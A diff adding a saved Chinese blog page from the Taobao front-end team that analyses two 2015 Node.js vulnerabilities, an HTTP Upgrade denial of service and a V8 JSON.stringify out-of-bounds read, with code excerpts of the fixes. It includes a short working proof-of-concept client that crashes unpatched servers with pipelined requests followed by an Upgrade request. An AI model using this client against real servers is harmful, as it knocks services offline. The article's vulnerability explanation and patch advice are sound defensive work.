@@ -1,0 +1,783 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>Node.js 2015-12-04 漏洞浅析 | Taobao FED | 淘宝前端团队</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="baidu-site-verification" content="OTHOW5vFFG">
+  <meta name="uyan_auth" content="5c52f7795a">
+  <meta name="description" content="前言Node.js 在 4 号放出了一个重要的更新，看了下更新日志，主要修复的是一些安全性的漏洞，包括 CVE-2015-8027 和 CVE-2015-6764 这两个漏洞，影响版本还是比较多的，v5.1.0、v4.2.2、v0.12.8 及以下都有波及。在更新发布后，简单看了下漏洞的细节，在这里简单介绍下。 CVE-2015-8027 Denial of Service Vulnerabil">
+<meta name="keywords" content="Node.js,漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Node.js 2015-12-04 漏洞浅析">
+<meta property="og:url" content="http://taobaofed.org/blog/2015/12/24/nodejs-2015-12-04-leak-analysis/index.html">
+<meta property="og:site_name" content="Taobao FED | 淘宝前端团队">
+<meta property="og:description" content="前言Node.js 在 4 号放出了一个重要的更新，看了下更新日志，主要修复的是一些安全性的漏洞，包括 CVE-2015-8027 和 CVE-2015-6764 这两个漏洞，影响版本还是比较多的，v5.1.0、v4.2.2、v0.12.8 及以下都有波及。在更新发布后，简单看了下漏洞的细节，在这里简单介绍下。 CVE-2015-8027 Denial of Service Vulnerabil">
+<meta property="og:locale" content="zh-cn">
+<meta property="og:image" content="http://img.alicdn.com/tps/TB1Lv00LXXXXXXFXFXXXXXXXXXX-900-500.jpg">
+<meta property="og:image" content="http://img2.tbcdn.cn/L1/461/1/6280461218b84b2e4bbbd8827f3d166a34cae9ae.jpeg">
+<meta property="og:updated_time" content="2019-03-13T02:32:26.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Node.js 2015-12-04 漏洞浅析">
+<meta name="twitter:description" content="前言Node.js 在 4 号放出了一个重要的更新，看了下更新日志，主要修复的是一些安全性的漏洞，包括 CVE-2015-8027 和 CVE-2015-6764 这两个漏洞，影响版本还是比较多的，v5.1.0、v4.2.2、v0.12.8 及以下都有波及。在更新发布后，简单看了下漏洞的细节，在这里简单介绍下。 CVE-2015-8027 Denial of Service Vulnerabil">
+<meta name="twitter:image" content="http://img.alicdn.com/tps/TB1Lv00LXXXXXXFXFXXXXXXXXXX-900-500.jpg">
+  
+    <link rel="alternative" href="http://taobaofed.org/atom.xml" title="Taobao FED | 淘宝前端团队" type="application/atom+xml">
+    <link rel="alternative" href="http://taobaofed.org/atom.xml" title="Taobao FED | 淘宝前端团队" type="application/rss+xml">
+  
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  <link rel="stylesheet" href="/css/style.css">
+  
+    <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  
+    <link rel="stylesheet" href="/scrollLoading/style.css">
+  
+
+  
+    <style type="text/css">
+      .logo { background-image:url(//img.alicdn.com/tps/TB1Nv_wKXXXXXbmXVXXXXXXXXXX-295-195.png); }
+    </style>
+  
+
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <script src="/js/jquery-2.1.3.min.js"></script>
+
+  <script type="text/javascript">
+    window.zhuge = window.zhuge || [];window.zhuge.methods = "_init debug identify track trackLink trackForm page".split(" ");
+    window.zhuge.factory = function(b) {return function() {var a = Array.prototype.slice.call(arguments);a.unshift(b);
+      window.zhuge.push(a);return window.zhuge;}};for (var i = 0; i < window.zhuge.methods.length; i++) {
+      var key = window.zhuge.methods[i];window.zhuge[key] = window.zhuge.factory(key);}window.zhuge.load = function(b, x) {
+      if (!document.getElementById("zhuge-js")) {var a = document.createElement("script");var verDate = new Date();
+        var verStr = verDate.getFullYear().toString()+ verDate.getMonth().toString() + verDate.getDate().toString();
+        a.type = "text/javascript";a.id = "zhuge-js";a.async = !0;a.src = (location.protocol == 'http:' ? "http://sdk.zhugeio.com/zhuge.min.js?v=" : 'https://zgsdk.zhugeio.com/zhuge.min.js?v=') + verStr;
+        a.onerror = function(){window.zhuge.identify = window.zhuge.track = function(ename, props, callback){if(callback && Object.prototype.toString.call(callback) === '[object Function]')callback();};};
+        var c = document.getElementsByTagName("script")[0];c.parentNode.insertBefore(a, c);window.zhuge._init(b, x)}};
+    window.zhuge.load('0ee24dc9de724f48915476a903b32794');//配置应用的AppKey
+  </script>
+
+</head>
+</html>
+<body>
+  <img src="//img.alicdn.com/tps/TB1GKckKXXXXXXIXpXXXXXXXXXX-400-400.png" alt="Taobao FED" style="position:absolute;left:-9999px">
+  <div id="wrap">
+    <header id="header">
+  <div id="header-outer" class="outer">
+    <div class="container">
+      <div class="container-inner">
+        <div id="header-title">
+          <h1 class="logo-wrap">
+            <a href="/" class="logo"></a>
+          </h1>
+          
+            <h2 class="subtitle-wrap">
+              <p class="subtitle">淘宝前端团队（FED）</p>
+              <p class="description">用技术为体验提供无限可能</p>
+            </h2>
+          
+        </div>
+        <div id="header-inner" class="nav-container">
+          <a id="main-nav-toggle" class="nav-icon fa fa-bars"></a>
+          <div class="nav-container-inner">
+            <ul id="main-nav">
+              <li class="main-nav-list-item"><a class="main-nav-list-link" href="/">主页</a></li>
+              
+                
+                <li class="main-nav-list-item">
+                  <a class="main-nav-list-link" href="/categories/Web开发/">Web开发</a>
+                </li>
+                
+              
+                
+                <li class="main-nav-list-item">
+                  <a class="main-nav-list-link" href="/categories/Node-js/">Node.js</a>
+                </li>
+                
+              
+                
+                <li class="main-nav-list-item">
+                  <a class="main-nav-list-link" href="/categories/无线开发/">无线开发</a>
+                </li>
+                
+              
+                
+                <li class="main-nav-list-item">
+                  <a class="main-nav-list-link" href="/categories/工具-平台/">工具&amp;平台</a>
+                </li>
+                
+              
+                
+                <li class="main-nav-list-item">
+                  <a class="main-nav-list-link" href="/categories/团队生活/">团队生活</a>
+                </li>
+                
+              
+                
+                <li class="main-nav-list-item">
+                  <a class="main-nav-list-link" href="/about/">关于我们</a>
+                </li>
+                
+              
+            </ul>
+            <nav id="sub-nav">
+              <div id="search-form-wrap">
+                <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><input type="hidden" name="sitesearch" value="http://taobaofed.org"></form>
+              </div>
+            </nav>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <div class="main-body container-inner">
+        <div class="main-body-inner">
+          <section id="main">
+            <div class="main-body-header">
+
+              <h1 class="header"><a class="page-title-link" href="/categories/Node-js/">Node.js</a></h1>
+            </div>
+            <div class="main-body-content">
+              
+  <article id="post-nodejs-2015-12-04-leak-analysis" class="article article-single article-type-post" itemprop="blogPost" itemscope>
+    <div class="article-inner">
+      <!--  -->
+      
+        <header class="article-header">
+          
+  
+    <h1 class="article-title" itemprop="name">
+      Node.js 2015-12-04 漏洞浅析
+    </h1>
+  
+
+        </header>
+      
+      <p class="article-byline">
+        
+        <span>作者: 凌恒</span>
+        
+        <span>发表于: <a href="/blog/2015/12/24/nodejs-2015-12-04-leak-analysis/" class="article-date">
+  <time datetime="2015-12-24T10:15:06.000Z" itemprop="datePublished">2015-12-24</time>
+</a></span>
+      </p>
+      <div class="article-entry" itemprop="articleBody">
+        <p><img src="//img.alicdn.com/tps/TB1Lv00LXXXXXXFXFXXXXXXXXXX-900-500.jpg" alt="Node.js 2015-12-04 漏洞浅析"></p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Node.js 在 4 号放出了一个重要的更新，看了下<a href="https://nodejs.org/en/blog/vulnerability/cve-2015-8027_cve-2015-6764/" target="_blank" rel="noopener">更新日志</a>，主要修复的是一些安全性的漏洞，包括 CVE-2015-8027 和 CVE-2015-6764 这两个漏洞，影响版本还是比较多的，v5.1.0、v4.2.2、v0.12.8 及以下都有波及。在更新发布后，简单看了下漏洞的细节，在这里简单介绍下。</p>
+<h2 id="CVE-2015-8027-Denial-of-Service-Vulnerability"><a href="#CVE-2015-8027-Denial-of-Service-Vulnerability" class="headerlink" title="CVE-2015-8027 Denial of Service Vulnerability"></a>CVE-2015-8027 Denial of Service Vulnerability</h2><p>这个漏洞看起来应该是 Node.js 开发者书写时的疏忽，在调用 <code>parser.pause</code> 方法时，没有判断 <code>parser</code> 是否存在，导致在特定情况运行时底层抛出 <code>Type Error</code> 错误，使进程崩溃。<br>主要涉及到下面的几个关键字：</p>
+<ul>
+<li>highWaterMark</li>
+<li>http method: UPGRADE</li>
+<li>response 处理</li>
+</ul>
+<h3 id="highWaterMark"><a href="#highWaterMark" class="headerlink" title="highWaterMark"></a>highWaterMark</h3><p>它是一个在创建流时可以修改大小的参数，作用跟字面意思差不多，高水位线。在 Readable Stream 中，用来控制底层读取前缓冲区资源的最多字节数；在 Writable Steam 中，用来控制写入时待处理缓冲区中最多存放的字节数。超过这个值时，会将 Steam 置为 pause 状态，这个操作便是触发这个漏洞的关键。看下代码，在 <a href="https://github.com/nodejs/node/blob/master/lib/_http_server.js#L454" target="_blank" rel="noopener">_http_server.js#454 parserOnIncoming</a> 方法中：</p>
+<pre><code>function parserOnIncoming(req, shouldKeepAlive) {
+  ...
+  if (!socket._paused) {
+    var needPause = socket._writableState.needDrain ||
+      outgoingData &gt;= socket._writableState.highWaterMark;
+    if (needPause) {
+      socket._paused = true;
+      socket.pause();
+    }
+  }
+  ...
+}
+</code></pre><p>​值得一提的是，这个值的调整，对 I/O 操作有一定的优化能力。它默认的值是 16KB，对于对象流则为 16。如果这个值设置的过小，会导致系统调用过于频繁；如果设置过大，那么会导致资源分配的浪费，所以修改需要谨慎。</p>
+<h3 id="UPGRADE"><a href="#UPGRADE" class="headerlink" title="UPGRADE"></a>UPGRADE</h3><p>这是一个 HTTP/1.1 标准中提出的一种头部方法。当客户端发送 UPGRADE，并指定其他的通讯协议，如果服务器支持，则必须返回 101，并且将通讯协议进行转换。那么为什么它会用来触发这漏洞呢？</p>
+<p>因为在 http server 升级协议时，会把当前用到的 parser 释放掉，导致 socket.parser 就变成了 null，自然在后面调用时就会出错。具体代码位置在 <a href="https://github.com/nodejs/node/blob/master/lib/_http_server.js#L371" target="_blank" rel="noopener">_http_server.js#371 onParserExecuteCommon</a> 方法中：</p>
+<pre><code>function onParserExecuteCommon(ret, d) {
+  if (ret instanceof Error) {
+    debug(&apos;parse error&apos;);
+    socket.destroy(ret);
+  } else if (parser.incoming &amp;&amp; parser.incoming.upgrade) {
+    ...
+    parser.finish();
+    freeParser(parser, req, null);
+    parser = null;
+    ...
+  }
+
+  //修正前：
+  //if (socket._paused) {
+  if (socket._paused &amp;&amp; socket.parser) {
+    debug(&apos;pause parser&apos;);
+    socket.parser.pause();
+  }
+}
+</code></pre><p>所以，它就成了触发条件。</p>
+<p>你可能会想，我的应用中没有用到 UPGRADE 方法，应该不会有影响吧？这其实跟你的应用中是否用了 UPGRADE 没有什么关系，这是在底层处理收到请求的过程中发生的错误，还没有到应用代码执行的层面，所以不是应用可控的。即使你监听了 <code>upgrade</code> 事件，它也是异步的，而且你也只是处理是否接受 UPGRADE 以及后续处理（比如：切断连接）的问题，一样会触发报错。</p>
+<h3 id="Response-处理"><a href="#Response-处理" class="headerlink" title="Response 处理"></a>Response 处理</h3><p>Node.js 在处理 Http 请求的响应时，使用了一个 <code>outgoing</code> 数组。在请求进来时，会创建一个 <code>ServerResponse</code> 对象，并将它 <code>push</code> 到 <code>outgoing</code> 数组中。当响应内容过多时，会发生排队的情况，当数据量超过 <code>highWaterMark</code> 时，就会导致 socket 的 pause。这里面涉及到的更多的内容，以后再细说。这部分相关代码，在 <a href="https://github.com/nodejs/node/blob/master/lib/_http_server.js#L454" target="_blank" rel="noopener">_http_server.js#454 parserOnIncoming</a>：</p>
+<pre><code>function parserOnIncoming(req, shouldKeepAlive) {
+  ...
+  var res = new ServerResponse(req);
+  res._onPendingData = updateOutgoingData;
+  ...
+  if (socket._httpMessage) {
+    outgoing.push(res);
+  } else {
+    res.assignSocket(socket);
+  }
+  ...
+}
+</code></pre><h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><p>根据上面的介绍，可以看到，这个漏洞的触发过程大致如下：</p>
+<ol>
+<li>向服务端快速的发送大量请求，使服务端对应 socket 触发 pause 状态。</li>
+<li>发送 UPGRADE 请求，触发服务端进入 upgrade 处理。</li>
+</ol>
+<p>我们先来写一个 server，当有请求来的时候，会写一个大小 1024 的 Buffer，这个大小随你控制，用 1024 比较好计算。</p>
+<pre><code>&apos;use strict&apos;;
+const http = require(&apos;http&apos;);
+const PORT = 8989;
+const chunk = new Buffer(1024);
+
+chunk.fill(&apos;X&apos;);
+
+var server = http.createServer(function(req, res) {
+    res.end(chunk);
+}).listen(PORT);
+</code></pre><p>接下来写一个 client，用来发送请求，这里我们使用 net 模块来连接服务器并传输数据。在 client 里，要快速的发送请求，因为默认的 highWaterMark 大小是 16KB，所以我们发送 17 次请求，这样刚好超过它，触发 socket 的 pause 状态。然后发送一个 UPGRADE 请求，这样就会触发漏洞，导致服务器崩溃，具体代码如下：</p>
+<pre><code>&apos;use strict&apos;;
+
+const net = require(&apos;net&apos;);
+
+var socket = net.connect(8989);
+
+for (var i = 0; i &lt; 17; i ++) {
+  socket.write(&apos;GET / HTTP/1.1\r\n\r\n&apos;);
+}
+
+socket.write(
+  &apos;GET / HTTP/1.1\r\nConnection: upgrade\r\nUpgrade: ws\r\n\r\n&apos;
+);
+</code></pre><p><img src="http://img2.tbcdn.cn/L1/461/1/6280461218b84b2e4bbbd8827f3d166a34cae9ae.jpeg" alt="测试结果"></p>
+<p>一般 Node.js 应用会返回页面，这个也要写入 Buffer 的，所以也会出现写入超量的问题。用上面的代码测试了几个未升级的应用，会导致应用进程退出，但线上应用一般会有进程守护，所以在量小的情况下，影响还可控。如果量很大，即使应用不会退出，但 worker 进程一直重启，应用的状态也不会良好。</p>
+<p>另外，也可以在 Nginx 层面对连入请求进行过滤，是可以保护后面的 Node.js 应用的。</p>
+<p><strong>注意：请勿乱用</strong></p>
+<h2 id="CVE-2015-6764-V8-Out-of-bounds-Access-Vulnerability"><a href="#CVE-2015-6764-V8-Out-of-bounds-Access-Vulnerability" class="headerlink" title="CVE-2015-6764 V8 Out-of-bounds Access Vulnerability"></a>CVE-2015-6764 V8 Out-of-bounds Access Vulnerability</h2><p>这是 V8 的一个 bug，跟 Node.js 的实现并没有关系，它涉及到的方法是 <code>JSON.stringify</code>。在这个方法的实现中，会用到被转换对象的 getter 和 toJSON 两个方法，如果我们重载了对象的这两个方法，那么就会影响到转换的结果。对于数组来说，如果在其中改变了数组的长度，那么最后结果会发生什么呢？先来看个例子：</p>
+<pre><code>var array = [];
+for (var i = 0; i &lt; 10; i++) array[i] = i;
+var obj = {
+  toJSON: function() {
+    array.length = 1;
+    return &apos;obj&apos;;
+  }
+};
+array[0] = obj;
+JSON.stringify(array);
+</code></pre><p>这段代码在这个漏洞没有修复之前，运行结果类似这种：</p>
+<pre><code>&apos;[&quot;obj&quot;,null,128,3,4,5,6,7,8,9]&apos;
+</code></pre><p>显然，这个结果是错误的，因为 array 的长度变成了 1，后面的内容就不应该出现了。<br>在这个 bug 修复后的执行结果是这样的：</p>
+<pre><code>&apos;[&quot;obj&quot;,null,null,null,null,null,null,null,null,null]&apos;
+</code></pre><p>同样的，重载 getter 方法：</p>
+<pre><code>var array = [];
+for (var i = 0; i &lt; 10; i++) array[i] = i;
+var obj = {
+  get value() {
+      array.length = 1;
+      return &quot;obj&quot;;
+  }
+};
+array[0] = obj;
+JSON.stringify(array);
+//修复前
+&apos;[{&quot;value&quot;:&quot;obj&quot;},null,128,3,4,5,6,7,8,9]&apos;
+//修复后
+&apos;[{&quot;value&quot;:&quot;obj&quot;},null,null,null,null,null,null,null,null,null]&apos;
+</code></pre><p>更多测试用例，请看 <a href="https://github.com/nodejs/node/blob/master/deps/v8/test/mjsunit/regress/regress-crbug-554946.js" target="_blank" rel="noopener">regress-crbug-554946.js</a>。</p>
+<p>在 V8 这个方法的之前的实现中，只是简单的遍历元素，然后根据对应的类型，进行相应的转换，形成结果。<br><a href="https://github.com/nodejs/node/blob/76a552c938e43eebbd0795e974f71250529f8cf5/deps/v8/src/json-stringifier.h#L429" target="_blank" rel="noopener"> [76a552]json-stringifier.h#L429 </a></p>
+<pre><code>BasicJsonStringifier::Result BasicJsonStringifier::SerializeJSArray(
+    Handle&lt;JSArray&gt; object) {
+  ...
+  uint32_t length = 0;
+  CHECK(object-&gt;length()-&gt;ToArrayLength(&amp;length));
+  builder_.AppendCharacter(&apos;[&apos;);
+  Result result = SerializeJSArraySlow(object, length);
+  ...
+}
+</code></pre><p>修正之后，多了对数组类型的判断，根据不同的类型，采取不同的转换方法：<br><a href="https://github.com/nodejs/node/blob/master/deps/v8/src/json-stringifier.h#L430" target="_blank" rel="noopener">[master]json-stringifier.h#430</a></p>
+<pre><code>BasicJsonStringifier::Result BasicJsonStringifier::SerializeJSArray(
+    Handle&lt;JSArray&gt; object) {
+  ...
+  switch(object-&gt;GetElementsKind()) {
+    case FAST_SMI_ELEMENTS: {
+      ...
+    }
+    case FAST_DOUBLE_ELEMENTS: {
+      ...
+    }
+    case FAST_ELEMENTS: {
+      Handle&lt;Object&gt; old_length(object-&gt;length(), isolate_);
+      for (uint32_t i = 0; i &lt; length; i++) {
+        if (object-&gt;length() != *old_length ||
+            object-&gt;GetElementsKind() != FAST_ELEMENTS) {
+          Result result = SerializeJSArraySlow(object, i, length);
+          if (result != SUCCESS) return result;
+          break;
+        }
+        if (i &gt; 0) builder_.AppendCharacter(&apos;,&apos;);
+        Result result = SerializeElement(
+            isolate_,
+            Handle&lt;Object&gt;(FixedArray::cast(object-&gt;elements())-&gt;get(i),
+                           isolate_),
+            i);
+        if (result == SUCCESS) continue;
+        if (result == UNCHANGED) {
+          builder_.AppendCString(&quot;null&quot;);
+        } else {
+          return result;
+        }
+      }
+      break;
+    }
+    default: {
+      ...
+      Result result = SerializeJSArraySlow(object, 0, length);
+      ...
+    }
+
+}
+</code></pre><p>主要是在 <code>FAST_ELEMENTS</code> 这个类型上，它会在遍历是动态的计算数组的长度，如果数组长度发生变化，会根据新的长度，直接运行 <code>SerializeJSArraySlow</code> 方法得到最终结果，否则会一个一个元素的处理。</p>
+<p>同时，<code>SerializeJSArraySlow</code> 方法也做了修改，增加了一个参数 <code>start</code> 用来标识遍历的起始值，不会每次都从 0 的位置开始遍历。</p>
+<p>总体看来，这个 bug 的触发条件还是挺复杂的，一般很少会遇到。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
+<li>细节对于代码质量，应用稳定性来说，很重要。特别是提供给别人用的库，一定要考虑全面</li>
+<li>很多异常的触发是很巧妙的，这是一个比较困扰的问题，测试贡献的能力也有限，不过也不能忽略测试，还是很重要的。</li>
+<li>请及时更新到修复后的版本，v5.1.1、v4.2.3、v0.12.9。</li>
+</ul>
+<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://github.com/nodejs/node/commit/11433127c717b02859c9aef063217b5a0797e6b3" target="_blank" rel="noopener">5.1.1 发布 release</a></p>
+
+      <script>
+        window.disqusProxy={
+          shortname: 'taobaofed',
+          username: 'taobaofed',
+          server: '184.170.213.204',
+          port: 8999,
+          adminAvatar: '/avatars/admin-avatar.jpg',
+          identifier: 'blog/2015/12/24/nodejs-2015-12-04-leak-analysis/',
+        };
+        window.disqus_config = function () {
+          this.page.url = window.location.href;
+          this.page.identifier = window.disqusProxy.identifier;
+        };
+      </script>
+      </div>
+      <footer class="article-footer">
+        <a data-url="http://taobaofed.org/blog/2015/12/24/nodejs-2015-12-04-leak-analysis/" data-id="cjt6lbxzt0078jeu1vfdu4fdg" class="article-share-link">
+          <i class="fa fa-share"></i>
+          分享到
+        </a>
+        
+          <a href="http://taobaofed.org/blog/2015/12/24/nodejs-2015-12-04-leak-analysis/#comments" class="article-comment-link">
+            <i class="fa fa-comments"></i>
+            评论
+          </a>
+        
+        
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Node-js/">Node.js</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞/">漏洞</a></li></ul>
+
+      </footer>
+    </div>
+  </article>
+  <script>
+    window.disqusProxy = {
+      shortname: 'taobaofed',
+      username: 'taobaofed',
+      server: '45.32.165.111',
+      port: 8999,
+      identifier: location.pathname
+    };
+    window.disqus_config = function () {
+      this.page.url = window.location.href;
+      this.page.identifier = window.disqusProxy.identifier;
+    };
+  </script>
+  
+  <section id="comments">
+    
+      <script src="//cdn.bootcss.com/react/16.0.0/umd/react.production.min.js"></script>
+      <script src="//cdn.bootcss.com/react-dom/16.0.0/umd/react-dom.production.min.js"></script>
+      <script src="//cdn.bootcss.com/fetch/2.0.3/fetch.min.js"></script>
+      <script src="//cdn.jsdelivr.net/npm/blockies-identicon@0.1.0/blockies.min.js"></script>
+      <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
+      <div id="disqus_proxy_thread"><script src="/scripts/hexo-disqus-proxy-primary.js" async></script>
+      <div id="pre-loading-comments" style="margin: 0 auto; text-align: center;">
+        <img style="width: 107px;display: inline-block;vertical-align: middle;" src="//gw.alicdn.com/tfs/TB1Ey8Ba21TBuNjy0FjXXajyXXa-638-117.png">
+        <span style="
+            box-sizing: border-box;
+            width: 16px;
+            height: 16px;
+            margin-left: 10px;
+            border-width: 2px;
+            border-style: solid;
+            border-color: rgba(51, 54, 58, .4) transparent;
+            border-radius: 13px;
+            transform-origin: 50% 50% 0;
+            transition: transform 700s linear;
+            display: inline-block;
+            transform: rotate(360000deg);
+            vertical-align: middle;">
+          </span>
+        <p style="line-height: 35px;color: #cccccc;font-size: 12px;">正在使用 Disqus 评论，请保持网络畅通</p>
+      </div>
+    </div>
+    
+  </section>
+  
+
+
+            </div>
+          </section>
+          <aside id="sidebar">
+  <a class="sidebar-toggle" title="Expand Sidebar"><i class="toggle icon"></i></a>
+  <div class="sidebar-top">
+    <p>关注我们 :</p>
+    <ul class="social-links">
+      
+        <li><a class="social-tooltip" title="github" href="https://github.com/taobaofed" target="_blank"><i class="icon fa fa-github"></i></a></li>
+      
+        <li><a class="social-tooltip" title="weibo" href="http://weibo.com/taobaofed" target="_blank"><i class="icon fa fa-weibo"></i></a></li>
+      
+        <li><a class="social-tooltip" title="rss" href="/atom.xml" target="_blank"><i class="icon fa fa-rss"></i></a></li>
+      
+    </ul>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/blog/2015/12/28/anim-train/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">下一篇</strong>
+      <p class="article-nav-title">
+        
+          小火车是怎么跑起来的
+        
+      </p>
+      <i class="icon fa fa-chevron-right" id="icon-chevron-right"></i>
+    </a>
+  
+  
+    <a href="/blog/2015/12/23/develop-tvos-app-with-javascript/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">上一篇</strong>
+      <p class="article-nav-title">使用 JavaScript 开发原生 tvOS 应用</p>
+      <i class="icon fa fa-chevron-left" id="icon-chevron-left"></i>
+    </a>
+  
+</nav>
+
+  
+  <div class="widgets-container">
+    
+      <div class="widget-wrap widget-open-source">
+  <h3 class="widget-title">开源产品</h3>
+  <ul class="open-source-list">
+    <!--<h3 class="widget-title">开源产品</h3>-->
+    
+    <li>
+      <a href="https://alibaba.github.io/rax/" target="_blank">
+        <span class="img" style="background-image: url(//gw.alicdn.com/L1/461/1/40137b64ab73a123e78d8246cd81c8379358c999_200x200.jpg)" title="A universal React-compatible render engine"></span>
+        <span class="title">Rax</span>
+      </a>
+    </li>
+    
+    <li>
+      <a href="https://alibaba.github.io/ice/" target="_blank">
+        <span class="img" style="background-image: url(//gw.alicdn.com/tfs/TB1JuqQcAyWBuNjy0FpXXassXXa-1079-1013.png)" title="赋能中后台建设"></span>
+        <span class="title">飞冰</span>
+      </a>
+    </li>
+    
+    <li>
+      <a href="http://www.midwayjs.org/pandora/zh-cn/" target="_blank">
+        <span class="img" style="background-image: url(//gw.alicdn.com/tfs/TB1QxmQcAyWBuNjy0FpXXassXXa-157-157.png)" title="Ready to launch Node.js application"></span>
+        <span class="title">Pandora.js</span>
+      </a>
+    </li>
+    
+    <li>
+      <a href="https://alibaba.github.io/bindingx/" target="_blank">
+        <span class="img" style="background-image: url(//gw.alicdn.com/tfs/TB1GLGCcrGYBuNjy0FoXXciBFXa-1293-1291.png)" title="Bind actions to effects"></span>
+        <span class="title">BindingX</span>
+      </a>
+    </li>
+    
+    <li>
+      <a href="https://alibaba.github.io/GCanvas/" target="_blank">
+        <span class="img" style="background-image: url(//gw.alicdn.com/tfs/TB1iYPgcxGYBuNjy0FnXXX5lpXa-130-130.png)" title="Draw to your device directly"></span>
+        <span class="title">GCanvas</span>
+      </a>
+    </li>
+    
+    <li>
+      <a href="https://alibaba.github.io/G3D/" target="_blank">
+        <span class="img" style="background-image: url(//gw.alicdn.com/tfs/TB1zxCZcuSSBuNjy0FlXXbBpVXa-136-136.png)" title="A pure WebGL-compatible 3d render engine"></span>
+        <span class="title">G3D</span>
+      </a>
+    </li>
+    
+  </ul>
+</div>
+
+    
+      
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul id="recent-post" class>
+        
+          <li>
+            
+            <div class="item-thumbnail">
+              
+<a href="/blog/2019/03/13/fed-2019/" class="thumbnail">
+  
+    <span style="background-image:url(https://img.alicdn.com/tfs/TB1uzLwLQzoK1RjSZFlXXai4VXa-900-500.jpg
+)" alt="淘宝前端团队 2019 年实习生内部推荐通道已开启" class="thumbnail-image"></span>
+  
+</a>
+
+            </div>
+            
+            <div class="item-inner">
+              <p class="item-category"><a class="article-category-link" href="/categories/团队生活/">团队生活</a></p>
+              <p class="item-title"><a href="/blog/2019/03/13/fed-2019/" class="title">淘宝前端团队 2019 年实习生内部推荐通道已开启</a></p>
+              
+              <p class="item-author">by 梧忌</p>
+              
+              <p class="item-date">at <time datetime="2019-03-13T02:22:25.000Z" itemprop="datePublished">2019-03-13</time></p>
+            </div>
+          </li>
+        
+          <li>
+            
+            <div class="item-thumbnail">
+              
+<a href="/blog/2019/01/07/imgcook/" class="thumbnail">
+  
+    <span style="background-image:url(https://img.alicdn.com/tfs/TB19QQxApYqK1RjSZLeXXbXppXa-900-500.png
+)" alt="imgcook 体验版发布" class="thumbnail-image"></span>
+  
+</a>
+
+            </div>
+            
+            <div class="item-inner">
+              <p class="item-category"><a class="article-category-link" href="/categories/Web开发/">Web开发</a></p>
+              <p class="item-title"><a href="/blog/2019/01/07/imgcook/" class="title">imgcook 体验版发布</a></p>
+              
+              <p class="item-author">by 波本</p>
+              
+              <p class="item-date">at <time datetime="2019-01-07T09:09:12.000Z" itemprop="datePublished">2019-01-07</time></p>
+            </div>
+          </li>
+        
+          <li>
+            
+            <div class="item-thumbnail">
+              
+<a href="/blog/2018/12/17/webgl-texture/" class="thumbnail">
+  
+    <span style="background-image:url(https://img.alicdn.com/tfs/TB1ng7ewCzqK1RjSZFLXXcn2XXa-900-500.png
+)" alt="WebGL 纹理详解" class="thumbnail-image"></span>
+  
+</a>
+
+            </div>
+            
+            <div class="item-inner">
+              <p class="item-category"><a class="article-category-link" href="/categories/Web开发/">Web开发</a></p>
+              <p class="item-title"><a href="/blog/2018/12/17/webgl-texture/" class="title">WebGL 纹理详解</a></p>
+              
+              <p class="item-author">by 叶斋</p>
+              
+              <p class="item-date">at <time datetime="2018-12-17T07:35:29.000Z" itemprop="datePublished">2018-12-17</time></p>
+            </div>
+          </li>
+        
+          <li>
+            
+            <div class="item-thumbnail">
+              
+<a href="/blog/2018/11/27/hooks-and-function-component/" class="thumbnail">
+  
+    <span style="background-image:url(https://img.alicdn.com/tfs/TB11clIsgHqK1RjSZFkXXX.WFXa-900-500.png
+)" alt="前端架构杂思录：议 Function Component 与 Hooks" class="thumbnail-image"></span>
+  
+</a>
+
+            </div>
+            
+            <div class="item-inner">
+              <p class="item-category"><a class="article-category-link" href="/categories/Web开发/">Web开发</a></p>
+              <p class="item-title"><a href="/blog/2018/11/27/hooks-and-function-component/" class="title">前端架构杂思录：议 Function Component 与 Hooks</a></p>
+              
+              <p class="item-author">by 元彦</p>
+              
+              <p class="item-date">at <time datetime="2018-11-27T03:18:33.000Z" itemprop="datePublished">2018-11-27</time></p>
+            </div>
+          </li>
+        
+          <li>
+            
+            <div class="item-thumbnail">
+              
+<a href="/blog/2018/10/31/a-tag/" class="thumbnail">
+  
+    <span style="background-image:url(https://gw.alicdn.com/tfs/TB1Q3Y4l4TpK1RjSZFGXXcHqFXa-900-500.jpg
+)" alt="Atag - Web Components 最佳实践" class="thumbnail-image"></span>
+  
+</a>
+
+            </div>
+            
+            <div class="item-inner">
+              <p class="item-category"><a class="article-category-link" href="/categories/Web开发/">Web开发</a></p>
+              <p class="item-title"><a href="/blog/2018/10/31/a-tag/" class="title">Atag - Web Components 最佳实践</a></p>
+              
+              <p class="item-author">by 卓凌</p>
+              
+              <p class="item-date">at <time datetime="2018-10-31T08:09:15.000Z" itemprop="datePublished">2018-10-31</time></p>
+            </div>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget-wrap widget-wechat">
+    <h3 class="widget-title">微信公众号</h3>
+    <a href="javascript:void(0) ">
